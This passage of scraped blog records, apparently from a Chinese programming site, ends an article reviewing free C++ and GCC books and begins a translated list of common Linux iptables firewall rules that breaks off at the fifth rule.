C结构体保存各种类型的数据成员，C联合体也定义了各种类型的数据成员。本章介绍了另外一种结构——类，与结构体不同的是，类成员默认是私有的</li>\n<li>静态数据和函数</li>\n<li>内存管理——用C++语言描述内存分配的运算符</li>\n<li>异常——允许C++程序执行受控的非本地返回命令，弥补了非局部跳转（longjmp）和设置局部跳转（setjmp）函数的缺点</li>\n<li>运算符重载——通用的运算符重载</li>\n<li>抽象容器</li>\n<li>继承——派生的另一个术语。本章演示了基类指针可能用于指向派生类对象</li>\n<li>多态——继承的一种特殊形态</li>\n<li>友元——介绍friend关键字及其使用原则</li>\n<li>成员指针——定义指向成员的指针及其使用，静态成员指针和指针长度</li>\n<li>嵌套类——在嵌套类与其外围类具有紧密概念关系的情况下使用</li>\n<li>标准模板库（STL）——由容器，通用算法，迭代器，函数对象，分配器，适配器和数据结构组成的通用库。这些算法使用的数据结构是抽象的，可以与（实际上）任何数据类型一起使用</li>\n<li>泛型算法——涵盖STL的通用算法</li>\n<li>函数模板——探讨模板的句法特性。介绍了模板类型参数，模板非类型参数和函数模板的概念，并提供了多个模板示例</li>\n<li>类模板——讨论构建和使用类模板</li>\n<li>高级模板使用——简要介绍模板元编程的主要特征和与模板相关的细微之处</li>\n</ul>\n<p>这本书有HTML，PDF，PostScript和Txt格式。它可以自由分发，并根据GNU通用公共许可证的条款发布。</p>\n<h2><a href=\"http://www.informit.com/store/introduction-to-design-patterns-in-c-plus-plus-with-9780131879058\" target=\"_blank\">《通过Qt4 介绍C++中的设计模式》（Introduction to Design Patterns in C++ with Qt 4, An）</a></h2>\n<p><img class=\"aligncenter\" src=\"http://wx4.sinaimg.cn/mw690/6941baebly1fey28ardhvj205k07cq34.jpg\"></p>\n<p style=\"text-align: center;\">作者 艾伦·尤斯特（Paul Ezust）, 656页</p>\n<p>本书首先介绍C++基本组成，面向对象的概念，UML（统一建模语言）和核心Qt类。进而转向更高层次的编程思想，Qt模型和设计模式。最后一部分严谨地印证了C++的重要特性，完整地覆盖了函数，继承和多态性方面的内容。</p>\n<p>该书旨在用于大学课程，面向没有C或C ++编程经验的读者，还为教学工作者提供了Qt示例，练习，解决方案和授课幻灯片。</p>\n<p>这本书是Bruce Perens开源系列的一部分。 本系列的所有图书均以Open Publication License V1.0或更新版本发布。</p>\n<h2><a href=\"http://greenteapress.com/thinkcpp/index.html\" target=\"_blank\">《如何像计算机科学家一样思考（C++篇）》（How to Think Like a Computer Scientist: C++）</a></h2>\n<p><img class=\"aligncenter\" src=\"http://wx3.sinaimg.cn/mw690/6941baebly1fey28a4hlej205k06y0so.jpg\"></p>\n<p style=\"text-align: center;\">作者Allen B. Downey，191页</p>\n<p>《如何像计算机科学家一样思考》C++版本是一本简洁文雅的介绍如何使用C++编程语言进行软件设计的书。本书从最基本的概念开始，以阅读者容易接受的速度逐渐增添新内容，旨在把没有编程经验的读者培养成未来的开发人员。</p>\n<p>本书的主要内容：</p>\n<ul>\n<li>变量，表达式和语句</li>\n<li>函数</li>\n<li>条件和递归</li>\n<li>丰富的函数</li>\n<li>迭代</li>\n<li>字符串</li>\n<li>向量</li>\n<li>成员函数</li>\n<li>对象向量</li>\n<li>向量对象</li>\n<li>类和不变量</li>\n<li>文件输入/输出和apMatrixes</li>\n</ul>\n<p>本书是一本免费的C++版教科书，根据Creative Commons Attribution-NonCommercial 3.0 未本地化协议发布。</p>\n<h2><a href=\"http://www.informit.com/store/c-plus-plus-gui-programming-with-qt-3-9780131240728\" target=\"_blank\">《基于Qt3的C++ 图形界面编程》（C++ GUI Programming with Qt 3）</a></h2>\n<p style=\"text-align: center;\"><img src=\"http://wx1.sinaimg.cn/mw690/6941baebly1fey289h4pmj205k07amxf.jpg\"></p>\n<p style=\"text-align: center;\">作者 Jasmin Blanchette，Mark Summerfield，464页</p>\n<p>Qt的最新稳定版本是5.8。 本书指导读者如何使用Qt 3编写图形界面程序，Qt 3最近一个版本的是在2004年发布，但是有很多这本书对于Qt 4和Qt 5用户来说仍然是有意义的。</p>\n<p>本书需要读者对C++有基本的了解，这不是一本面向初学者的书。</p>\n<p>本书向读者介绍了使用Qt编写图形界面应用程序的所有概念和实践，对核心问题进行了详细周密的讲解，还提供一些专业前沿的学习资料。</p>\n<p>这本书是Bruce Perens开源系列的一部分。本系列的所有图书均以Open Publication License V1.0或更新版本发布的。</p>\n<h2><a href=\"http://opendatastructures.org/ods-cpp/\" target=\"_blank\">《开放式数据结构( C++版)》（Open Data Structures (in C++)）</a></h2>\n<p><img class=\"aligncenter\" src=\"http://wx3.sinaimg.cn/mw690/6941baebly1fey287urhpj205k08cjrk.jpg\"></p>\n<p style=\"text-align: center;\">作者 Pat Morin，336页</p>\n<p>本书讲授了基本的数据结构设计和分析及在C ++中的实现。它涵盖了序列（列表），队列，优先级队列，无序字典，有序字典以及图的数据结构的实现和分析。作者意图在于为计算机科学专业的学生提供一条研究数据结构的免费途径。但是本书不是一本介绍C++编程语言或C++标准模板库的书，但是它有助于程序员了解STL数据结构如何实现以及为什么这些实现是高效的。</p>\n<p>书中章节涵盖了基于数组的列表，链表，分级链表，哈希表，二叉树（包括随机二叉搜索树，替罪羊树和红黑树）。稍后的章节介绍了堆，排序算法（基于比较，计数排序和基数排序），图，整型数据结构和外存搜索。</p>\n<p>这本书是根据知识共享署名许可颁发的。我们可以免费阅读这本书的HTML，PDF版本，本书的LaTeX版本，Java / C ++ / Python源码可以从GitHub下载。还有平装版购买。本书已被翻译成斯洛文尼亚语和土耳其语。</p>\n<h2><a href=\"http://www.informit.com/store/cross-platform-gui-programming-with-wxwidgets-9780131473812\" target=\"_blank\">《使用wxWidgets跨平台GUI编程》（Cross-Platform GUI Programming with wxWidgets）</a></h2>\n<p style=\"text-align: center;\"><img src=\"http://wx2.sinaimg.cn/mw690/6941baebly1fey286wse2j205k07cwep.jpg\"></p>\n<p style=\"text-align: center;\">作者 Julian Smart，Kevin Hock与Stefan CsomorBrifll，744页</p>\n<p>wxWidgets是一个流行的C++库，它允许开发人员使用单一的代码库为Windows，Mac OS X，Linux和其他平台创建应用程序。它支持各种图形库。</p>\n<p>本书的简要介绍和入门章节涵盖了以下内容：</p>\n<ul>\n<li>事件处理</li>\n<li>窗口基础</li>\n<li>绘图</li>\n<li>输入事件处理</li>\n<li>使用sizers窗口布局</li>\n<li>使用标准对话框</li>\n<li>创建自定义对话框</li>\n<li>图像编程</li>\n<li>剪贴板和拖放</li>\n<li>高级窗口类</li>\n<li>数据结构类</li>\n<li>文件和流</li>\n<li>内存管理，调试和错误检查</li>\n<li>编写国际化应用</li>\n<li>编写多线程应用程序</li>\n<li>wxSocket编程</li>\n<li>处理文档和视图</li>\n<li>完善你的应用程序</li>\n</ul>\n<p>这本书是Bruce Perens开源系列的一部分。本系列的所有图书均以Open Publication License V1.0或更新版本发布。</p>\n<h2><a href=\"https://rooksguide.org/\" target=\"_blank\">《Rook的C++指南》（The Rook’s Guide to C++）</a></h2>\n<p style=\"text-align: center;\"><img src=\"http://wx1.sinaimg.cn/mw690/6941baebly1fey286bh24j205k08c74m.jpg\"></p>\n<p style=\"text-align: center;\">作者 Jeremy Hansen，160页</p>\n<p>书中的章节涵盖变量，文本，常量，输出输入，数据类型和转换，条件判断（if，else和else if，switch语句），字符串，循环，数组，块，函数和作用域。之后的章节对解决问题和问题定位进行了讲述，包括预处理器，高级算法，文件I / O，指针，动态数据，类和抽象，编译分离和STL。</p>\n<p>这本书的大部分内容是由25位诺维奇大学的学生在一个黑客马拉松周写的，虽然不够完美，但还是一本不错的书。 它是根据基于Creative Commons Attribution-NonCommercial-ShareAlike 3.0.协议发布许可证发布的，也可以从亚马逊购买纸质版。</p>\n<h2><a href=\"http://www.network-theory.co.uk/docs/gccintro/\">《GCC概述》（An Introduction to GCC）</a></h2>\n<p style=\"text-align: center;\"><img src=\"http://wx2.sinaimg.cn/mw690/6941baebly1fey285rli0j205k08c3z2.jpg\"></p>\n<p style=\"text-align: center;\">作者 Brian Gough，144页</p>\n<p>本书主要介绍了 GNU C 和 C++编译器：gcc 和 g ++。二者都是GNU编译器集合（GCC）的一部分。</p>\n<p>书中如何使用编译器本身。作者根据多年来在邮件列表上发表的问题，引导读者直接了解到GCC最重要的部分。</p>\n<p>本书章节包括：</p>\n<ul>\n<li>简介</li>\n<li>编译C程序——介绍如何使用gcc编译C程序。程序可能由单个源文件或多个源文件中编译而成，也可以使用系统库和头文件</li>\n<li>编译选项——描述了GCC中可用编译器中常见的其他选项。这些选项对应不同的功能，例如用于设置库和所包含文件的搜索路径，配置额外的警告和诊断信息，预处理器宏和C语言</li>\n<li>使用预处理器——描述了GCC包内的GNU C预处理器cpp的使用，预处理器在源文件编译之前扩展了宏。当GCC处理C或C ++程序时，预处理都会自动调用</li>\n<li>编译调试——提供-g调试选项，用于在目标文件和可执行文件中存储附加的调试信息。这些调试信息可以将错误信息从特定的机器指令追溯到原始源文件中相应的行</li>\n<li>编译优化——GCC是一个优化编译器。它提供了很多选项，旨在提高其生成的可执行文件的速度或减小文件大小</li>\n<li>编译C ++程序——描述了如何使用GCC编译用C ++编写程序，以及针对于该语言的命令行选项</li>\n<li>平台特定选项——介绍常见平台的一些可用选项，如Intel和AMD x86选项，x86扩展选项，x86 64位处理器选项，DEC Alpha选项，SPARC选项，POWER / PowerPC选项，多体系架构支持以及浮点相关问题</li>\n<li>疑难解答（问题定位）——GCC提供了几个帮助和诊断选项，来帮助用户定位编译过程中的问题</li>\n<li>与编译器相关的工具——描述了很多与GCC结合使用的工具，包括用于创建库的GNU归档器ar，以及GNU性能和覆盖测试程序，gprof和gcov</li>\n<li>编译器如何工作——对GCC如何将源文件转换为可执行文件进行了更详细地描述。编译是一个多阶段的过程，涉及多个工具，包括GNU编译器本身（通过gcc或g++前端），GNU 汇编器as和GNU 链接器ld。在编译过程中使用的一套完整工具集称为工具链</li>\n<li>检查编译后的文件——描述了多种有用的工具，用于检查可执行文件和目标文件的内容</li>\n<li>常见错误消息——描述 gcc和g ++生成的最常见的错误和警告消息。每个案例都附有错误和警告信息产生原因的描述，以及相应的例子和可能的解决方案和建议</li>\n<li>获取帮助——如果读者遇到简介里未涉及的问题，还有多种参考手册更详细地描述了GCC和语言相关的主题</li>\n</ul>\n<p>本书根据 GNU 自由文档许可证发布。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"110975\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"110975votetotal\">3</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"110975\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 22 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/nemoland\">李大萌</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/nemoland\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2015/04/8fbdaaa5ea6d3b49c8c1c825aafeb5d9.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            码农一枚        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/nemoland\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/nemoland/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/nemoland/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 19</a> · <a title=\"QQ：727231337\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a> <a title=\"个人微信：qq_nemo\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2012/03/cpp-code.jpg"], "fav_nums": 22, "comment_nums": 2, "create_date": "2017/04/25", "praise_nums": 3}
{"tags": " 2 评论 ,iptables,IT技术,Linux", "front_image_path": "full/3baa3435a22114c8731af7f7b09f8a2962f9ac57.jpg", "title": "25 个常用的 Linux iptables 规则", "url_object_id": "fa473b2e10e29be9b4f7d3370767367d", "url": "http://blog.jobbole.com/108468/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/aoi\">伯小乐</a> 翻译。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://gist.github.com/virtualstaticvoid/1024546\">gist</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>一些常用的 Linux iptables 规则，请根据自己的具体需要再修改。</p>\n<p><img class=\"alignnone size-full wp-image-111000\" src=\"http://jbcdn2.b0.upaiyun.com/2016/12/86e7a2063176621434fa881157f4a5b7.jpg\" alt=\"iptables-network-security\"></p>\n<h3># 1. 删除所有现有规则</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976c9f239857366\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\niptables -F</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976c9f239857366-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976c9f239857366-1\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">F</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3># 2. 设置默认的 chain 策略</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976cab606109070\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\niptables -P INPUT DROP\r\niptables -P FORWARD DROP\r\niptables -P OUTPUT DROP</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976cab606109070-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976cab606109070-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b21c976cab606109070-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976cab606109070-1\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">P</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">INPUT </span><span class=\"crayon-e\">DROP</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976cab606109070-2\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">P</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">FORWARD </span><span class=\"crayon-e\">DROP</span></div><div class=\"crayon-line\" id=\"crayon-594b21c976cab606109070-3\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">P</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">OUTPUT </span><span class=\"crayon-v\">DROP</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p></p>\n<h3># 3. 阻止某个特定的 IP 地址</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976cb0217763070\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#BLOCK_THIS_IP=\"x.x.x.x\"\r\n#iptables -A INPUT -s \"$BLOCK_THIS_IP\" -j DROP</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976cb0217763070-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976cb0217763070-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976cb0217763070-1\"><span class=\"crayon-p\">#BLOCK_THIS_IP=\"x.x.x.x\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976cb0217763070-2\"><span class=\"crayon-p\">#iptables -A INPUT -s \"$BLOCK_THIS_IP\" -j DROP</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p>\n<h3># 4. 允许全部进来的（incoming）SSH</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976cb3328501466\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\niptables -A INPUT -i eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT\r\niptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976cb3328501466-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976cb3328501466-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976cb3328501466-1\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">INPUT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">eth0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">dport</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">state </span><span class=\"crayon-r\">NEW</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">ESTABLISHED</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ACCEPT</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976cb3328501466-2\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">OUTPUT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">eth0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">sport</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">state </span><span class=\"crayon-v\">ESTABLISHED</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ACCEPT</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0017 seconds] -->\r\n<p></p>\n<h3># 5. 只允许某个特定网络进来的 